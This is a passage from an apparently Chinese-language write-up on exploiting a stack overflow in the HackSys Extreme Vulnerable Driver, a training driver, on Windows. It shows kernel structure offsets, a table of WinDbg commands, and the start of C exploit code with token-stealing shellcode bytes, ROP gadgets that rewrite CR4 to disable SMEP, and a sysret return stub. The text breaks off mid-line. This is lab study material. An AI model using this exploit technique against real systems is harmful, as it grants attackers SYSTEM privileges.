0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">	;sti</span><br><span class="line">	mov rax, [gs:0x188]		; _KPCR.Prcb.CurrentThread</span><br><span class="line">	;mov cx, [rax + 0x1e4]		; KTHREAD.KernelApcDisable</span><br><span class="line">	;inc cx</span><br><span class="line">	;mov [rax + 0x1e4], cx</span><br><span class="line">	mov rdx, [rax + 0x90] 	; ETHREAD.TrapFrame</span><br><span class="line">	mov rcx, [rdx + 0x168]	; ETHREAD.TrapFrame.Rip</span><br><span class="line">	mov r11, [rdx + 0x178]	; ETHREAD.TrapFrame.EFlags</span><br><span class="line">	or r11, 0x200 ; 这样 sysret 恢复状态时，中断就会被打开</span><br><span class="line">	mov rsp, [rdx + 0x180]	; ETHREAD.TrapFrame.Rsp</span><br><span class="line">	mov rbp, [rdx + 0x158]	; ETHREAD.TrapFrame.Rbp</span><br><span class="line">	;db 0xcc</span><br><span class="line">	xor eax, eax 	; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">	swapgs</span><br><span class="line">	o64 sysret	; nasm shit</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-相关结构体"><a href="#5-相关结构体" class="headerlink" title="5.相关结构体"></a>5.相关结构体</h3><h4 id="EPROCESS-进程结构体"><a href="#EPROCESS-进程结构体" class="headerlink" title="_EPROCESS (进程结构体)"></a><strong>_EPROCESS</strong> (进程结构体)</h4><ul>
+<li><code>dt nt!_EPROCESS</code></li>
+<li>关键偏移：<ul>
+<li>0x440: <code>UniqueProcessId</code> (PID)</li>
+<li>0x448: <code>ActiveProcessLinks</code> (链表)</li>
+<li>0x4b8: <code>Token</code> (令牌)</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x460 Flags2           : Uint4B</span><br><span class="line">   +0x460 JobNotReallyActive : Pos 0, 1 Bit</span><br><span class="line">   +0x460 AccountingFolded : Pos 1, 1 Bit</span><br><span class="line">   +0x460 NewProcessReported : Pos 2, 1 Bit</span><br><span class="line">   +0x460 ExitProcessReported : Pos 3, 1 Bit</span><br><span class="line">   +0x460 ReportCommitChanges : Pos 4, 1 Bit</span><br><span class="line">   +0x460 LastReportMemory : Pos 5, 1 Bit</span><br><span class="line">   +0x460 ForceWakeCharge  : Pos 6, 1 Bit</span><br><span class="line">   +0x460 CrossSessionCreate : Pos 7, 1 Bit</span><br><span class="line">   +0x460 NeedsHandleRundown : Pos 8, 1 Bit</span><br><span class="line">   +0x460 RefTraceEnabled  : Pos 9, 1 Bit</span><br><span class="line">   +0x460 PicoCreated      : Pos 10, 1 Bit</span><br><span class="line">   +0x460 EmptyJobEvaluated : Pos 11, 1 Bit</span><br><span class="line">   +0x460 DefaultPagePriority : Pos 12, 3 Bits</span><br><span class="line">   +0x460 PrimaryTokenFrozen : Pos 15, 1 Bit</span><br><span class="line">   +0x460 ProcessVerifierTarget : Pos 16, 1 Bit</span><br><span class="line">   +0x460 RestrictSetThreadContext : Pos 17, 1 Bit</span><br><span class="line">   +0x460 AffinityPermanent : Pos 18, 1 Bit</span><br><span class="line">   +0x460 AffinityUpdateEnable : Pos 19, 1 Bit</span><br><span class="line">   +0x460 PropagateNode    : Pos 20, 1 Bit</span><br><span class="line">   +0x460 ExplicitAffinity : Pos 21, 1 Bit</span><br><span class="line">   +0x460 ProcessExecutionState : Pos 22, 2 Bits</span><br><span class="line">   +0x460 EnableReadVmLogging : Pos 24, 1 Bit</span><br><span class="line">   +0x460 EnableWriteVmLogging : Pos 25, 1 Bit</span><br><span class="line">   +0x460 FatalAccessTerminationRequested : Pos 26, 1 Bit</span><br><span class="line">   +0x460 DisableSystemAllowedCpuSet : Pos 27, 1 Bit</span><br><span class="line">   +0x460 ProcessStateChangeRequest : Pos 28, 2 Bits</span><br><span class="line">   +0x460 ProcessStateChangeInProgress : Pos 30, 1 Bit</span><br><span class="line">   +0x460 InPrivate        : Pos 31, 1 Bit</span><br><span class="line">   +0x464 Flags            : Uint4B</span><br><span class="line">   +0x464 CreateReported   : Pos 0, 1 Bit</span><br><span class="line">   +0x464 NoDebugInherit   : Pos 1, 1 Bit</span><br><span class="line">   +0x464 ProcessExiting   : Pos 2, 1 Bit</span><br><span class="line">   +0x464 ProcessDelete    : Pos 3, 1 Bit</span><br><span class="line">   +0x464 ManageExecutableMemoryWrites : Pos 4, 1 Bit</span><br><span class="line">   +0x464 VmDeleted        : Pos 5, 1 Bit</span><br><span class="line">   +0x464 OutswapEnabled   : Pos 6, 1 Bit</span><br><span class="line">   +0x464 Outswapped       : Pos 7, 1 Bit</span><br><span class="line">   +0x464 FailFastOnCommitFail : Pos 8, 1 Bit</span><br><span class="line">   +0x464 Wow64VaSpace4Gb  : Pos 9, 1 Bit</span><br><span class="line">   +0x464 AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class="line">   +0x464 SetTimerResolution : Pos 12, 1 Bit</span><br><span class="line">   +0x464 BreakOnTermination : Pos 13, 1 Bit</span><br><span class="line">   +0x464 DeprioritizeViews : Pos 14, 1 Bit</span><br><span class="line">   +0x464 WriteWatch       : Pos 15, 1 Bit</span><br><span class="line">   +0x464 ProcessInSession : Pos 16, 1 Bit</span><br><span class="line">   +0x464 OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class="line">   +0x464 HasAddressSpace  : Pos 18, 1 Bit</span><br><span class="line">   +0x464 LaunchPrefetched : Pos 19, 1 Bit</span><br><span class="line">   +0x464 Background       : Pos 20, 1 Bit</span><br><span class="line">   +0x464 VmTopDown        : Pos 21, 1 Bit</span><br><span class="line">   +0x464 ImageNotifyDone  : Pos 22, 1 Bit</span><br><span class="line">   +0x464 PdeUpdateNeeded  : Pos 23, 1 Bit</span><br><span class="line">   +0x464 VdmAllowed       : Pos 24, 1 Bit</span><br><span class="line">   +0x464 ProcessRundown   : Pos 25, 1 Bit</span><br><span class="line">   +0x464 ProcessInserted  : Pos 26, 1 Bit</span><br><span class="line">   +0x464 DefaultIoPriority : Pos 27, 3 Bits</span><br><span class="line">   +0x464 ProcessSelfDelete : Pos 30, 1 Bit</span><br><span class="line">   +0x464 SetTimerResolutionLink : Pos 31, 1 Bit</span><br><span class="line">   +0x468 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x470 ProcessQuotaUsage : [2] Uint8B</span><br><span class="line">   +0x480 ProcessQuotaPeak : [2] Uint8B</span><br><span class="line">   +0x490 PeakVirtualSize  : Uint8B</span><br><span class="line">   +0x498 VirtualSize      : Uint8B</span><br><span class="line">   +0x4a0 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x4b0 ExceptionPortData : Ptr64 Void</span><br><span class="line">   +0x4b0 ExceptionPortValue : Uint8B</span><br><span class="line">   +0x4b0 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
+
+<h4 id="KTHREAD-线程结构体"><a href="#KTHREAD-线程结构体" class="headerlink" title="_KTHREAD (线程结构体)"></a><strong>_KTHREAD</strong> (线程结构体)</h4><ul>
+<li><code>dt nt!_KTHREAD</code></li>
+<li>关键偏移：<ul>
+<li><code>ApcState.Process</code> (指向 EPROCESS)</li>
+<li><code>TrapFrame</code> (指向中断帧)</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+0x090 TrapFrame        : Ptr64 _KTRAP_FRAME</span><br><span class="line">+0x098 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure>
+
+<h4 id="KTRAP-FRAME-中断帧"><a href="#KTRAP-FRAME-中断帧" class="headerlink" title="_KTRAP_FRAME (中断帧)"></a><strong>_KTRAP_FRAME</strong> (中断帧)</h4><ul>
+<li><code>dt nt!_KTRAP_FRAME</code></li>
+<li>关键偏移：<code>Rip</code>, <code>Rsp</code>, <code>EFlags</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_KTRAP_FRAME</span><br><span class="line">   +0x000 P1Home           : Uint8B</span><br><span class="line">   +0x008 P2Home           : Uint8B</span><br><span class="line">   +0x010 P3Home           : Uint8B</span><br><span class="line">   +0x018 P4Home           : Uint8B</span><br><span class="line">   +0x020 P5               : Uint8B</span><br><span class="line">   +0x028 PreviousMode     : Char</span><br><span class="line">   +0x028 InterruptRetpolineState : UChar</span><br><span class="line">   +0x029 PreviousIrql     : UChar</span><br><span class="line">   +0x02a FaultIndicator   : UChar</span><br><span class="line">   +0x02a NmiMsrIbrs       : UChar</span><br><span class="line">   +0x02b ExceptionActive  : UChar</span><br><span class="line">   +0x02c MxCsr            : Uint4B</span><br><span class="line">   +0x030 Rax              : Uint8B</span><br><span class="line">   +0x038 Rcx              : Uint8B</span><br><span class="line">   +0x040 Rdx              : Uint8B</span><br><span class="line">   +0x048 R8               : Uint8B</span><br><span class="line">   +0x050 R9               : Uint8B</span><br><span class="line">   +0x058 R10              : Uint8B</span><br><span class="line">   +0x060 R11              : Uint8B</span><br><span class="line">   +0x068 GsBase           : Uint8B</span><br><span class="line">   +0x068 GsSwap           : Uint8B</span><br><span class="line">   +0x070 Xmm0             : _M128A</span><br><span class="line">   +0x080 Xmm1             : _M128A</span><br><span class="line">   +0x090 Xmm2             : _M128A</span><br><span class="line">   +0x0a0 Xmm3             : _M128A</span><br><span class="line">   +0x0b0 Xmm4             : _M128A</span><br><span class="line">   +0x0c0 Xmm5             : _M128A</span><br><span class="line">   +0x0d0 FaultAddress     : Uint8B</span><br><span class="line">   +0x0d0 ContextRecord    : Uint8B</span><br><span class="line">   +0x0d8 Dr0              : Uint8B</span><br><span class="line">   +0x0e0 Dr1              : Uint8B</span><br><span class="line">   +0x0e8 Dr2              : Uint8B</span><br><span class="line">   +0x0f0 Dr3              : Uint8B</span><br><span class="line">   +0x0f8 Dr6              : Uint8B</span><br><span class="line">   +0x100 Dr7              : Uint8B</span><br><span class="line">   +0x108 DebugControl     : Uint8B</span><br><span class="line">   +0x110 LastBranchToRip  : Uint8B</span><br><span class="line">   +0x118 LastBranchFromRip : Uint8B</span><br><span class="line">   +0x120 LastExceptionToRip : Uint8B</span><br><span class="line">   +0x128 LastExceptionFromRip : Uint8B</span><br><span class="line">   +0x130 SegDs            : Uint2B</span><br><span class="line">   +0x132 SegEs            : Uint2B</span><br><span class="line">   +0x134 SegFs            : Uint2B</span><br><span class="line">   +0x136 SegGs            : Uint2B</span><br><span class="line">   +0x138 TrapFrame        : Uint8B</span><br><span class="line">   +0x140 NmiPreviousSpecCtrl : Uint4B</span><br><span class="line">   +0x144 NmiPreviousSpecCtrlPad : Uint4B</span><br><span class="line">   +0x140 Rbx              : Uint8B</span><br><span class="line">   +0x148 Rdi              : Uint8B</span><br><span class="line">   +0x150 Rsi              : Uint8B</span><br><span class="line">   +0x158 Rbp              : Uint8B</span><br><span class="line">   +0x160 ErrorCode        : Uint8B</span><br><span class="line">   +0x160 ExceptionFrame   : Uint8B</span><br><span class="line">   +0x168 Rip              : Uint8B</span><br><span class="line">   +0x170 SegCs            : Uint2B</span><br><span class="line">   +0x172 Fill0            : UChar</span><br><span class="line">   +0x173 Logging          : UChar</span><br><span class="line">   +0x174 Fill1            : [2] Uint2B</span><br><span class="line">   +0x178 EFlags           : Uint4B</span><br><span class="line">   +0x17c Fill2            : Uint4B</span><br><span class="line">   +0x180 Rsp              : Uint8B</span><br><span class="line">   +0x188 SegSs            : Uint2B</span><br><span class="line">   +0x18a Fill3            : Uint2B</span><br><span class="line">   +0x18c Fill4            : Uint4B</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-调试命令-WinDbg"><a href="#6-调试命令-WinDbg" class="headerlink" title="6. 调试命令(WinDbg)"></a>6. 调试命令(WinDbg)</h3><table>
+<thead>
+<tr>
+<th><strong>场景</strong></th>
+<th><strong>命令</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>环境配置</strong></td>
+<td><code>bcdedit /dbgsettings</code></td>
+<td>查看&#x2F;设置调试 IP 和端口</td>
+</tr>
+<tr>
+<td><strong>崩溃分析</strong></td>
+<td><code>!analyze -v</code></td>
+<td>蓝屏后查看原因 (BugCheck Code)</td>
+</tr>
+<tr>
+<td><strong>寄存器</strong></td>
+<td><code>r cr4</code></td>
+<td>查看 SMEP&#x2F;SMAP 状态 (Bit 20&#x2F;21)</td>
+</tr>
+<tr>
+<td><strong>寄存器</strong></td>
+<td><code>rdmsr 0xC0000102</code></td>
+<td>查看 Kernel GS Base</td>
+</tr>
+<tr>
+<td><strong>内存查看</strong></td>
+<td><code>dq &lt;addr&gt; L10</code></td>
+<td>以 64 位格式查看内存</td>
+</tr>
+<tr>
+<td><strong>反汇编</strong></td>
+<td><code>u &lt;addr&gt; L10</code></td>
+<td>查看地址处的汇编代码</td>
+</tr>
+<tr>
+<td><strong>结构体</strong></td>
+<td><code>dt nt!_EPROCESS &lt;addr&gt;</code></td>
+<td>解析进程结构体</td>
+</tr>
+<tr>
+<td><strong>Token</strong></td>
+<td><code>!token &lt;addr&gt;</code></td>
+<td>解析 Token 权限 (看是否为 System)</td>
+</tr>
+<tr>
+<td><strong>页表</strong></td>
+<td><code>!pte &lt;addr&gt;</code></td>
+<td>查看虚拟地址的页表属性 (NX&#x2F;RW)</td>
+</tr>
+<tr>
+<td><strong>断点</strong></td>
+<td><code>bp &lt;addr&gt;</code></td>
+<td>下断点</td>
+</tr>
+<tr>
+<td><strong>断点</strong></td>
+<td><code>bl</code>&#x2F;<code>bc *</code></td>
+<td>列出断点 &#x2F; 清除所有断点</td>
+</tr>
+<tr>
+<td><strong>符号搜索</strong></td>
+<td><code>x nt!Ki*Shadow</code></td>
+<td>搜索内核符号 (如 KPTI 相关)</td>
+</tr>
+</tbody></table>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kwin.h&quot;</span></span></span><br><span class="line"><span class="comment">// 驱动设备名称</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span></span></span><br><span class="line"><span class="comment">// IOCTL 码：0x222003 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEVD_IOCTL_STACK_OVERFLOW 0x222003</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x80</span>, <span class="number">0x48</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xC0</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xFA</span>, <span class="number">0x04</span>, <span class="number">0x75</span>, <span class="number">0xF0</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x50</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE2</span>, <span class="number">0xF8</span>, <span class="number">0x49</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x25</span>, <span class="number">0x88</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>, <span class="number">0x68</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4C</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xCB</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xA2</span>, <span class="number">0x80</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xAA</span>, <span class="number">0x58</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xC0</span>, <span class="number">0x0F</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF8</span>, <span class="number">0x48</span>, <span class="number">0x0F</span>, <span class="number">0x07</span>, <span class="number">0xFF</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET 0x2079ac</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RAX_RET 0x201862</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0x3d0dea</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_R8_RET 0x201861</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_CR4_RCX_RET 0x3a0397</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_rax_qword_ptr_rcx_ret 0x32c1b0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> add_rax_qword_ptr_rcx_0xa0_ret 0x649ce1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mov_byte_ptr_rax_cl_ret 0x49cadd</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0x20003e</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HANDLE hDevice;</span><br><span class="line">    DWORD bytesReturned;</span><br><span class="line">    BOOL success;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 获取驱动句柄</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opening Driver...\n&quot;</span>);</span><br><span class="line">    hDevice = CreateFileA(</span><br><span class="line">        DEVICE_NAME,</span><br><span class="line">        GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open driver! Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Driver opened successfully!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 准备内存存放 Shellcode</span></span><br><span class="line">    LPVOID lpPayload = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="keyword">sizeof</span>(shellcode),</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!lpPayload) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to allocate memory for shellcode!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 把 Shellcode 复制进去</span></span><br><span class="line">    <span class="built_in">memcpy</span>(lpPayload, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Shellcode located at: 0x%p\n&quot;</span>, lpPayload);</span><br><span class="line">  </span><br><span class="line">    LPVOID userBuffer = VirtualAlloc(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0x900</span>,</span><br><span class="line">        MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">        PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(userBuffer, <span class="string">&#x27;\x41&#x27;</span>, <span class="number">0x818</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> kernelbase=GetKernelModuleAddress(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ExpAllocatePoolWithTagFromNode=kernelbase+<span class="number">0x2BC81F</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> memmove=kernelbase+<span class="number">0x413540</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span 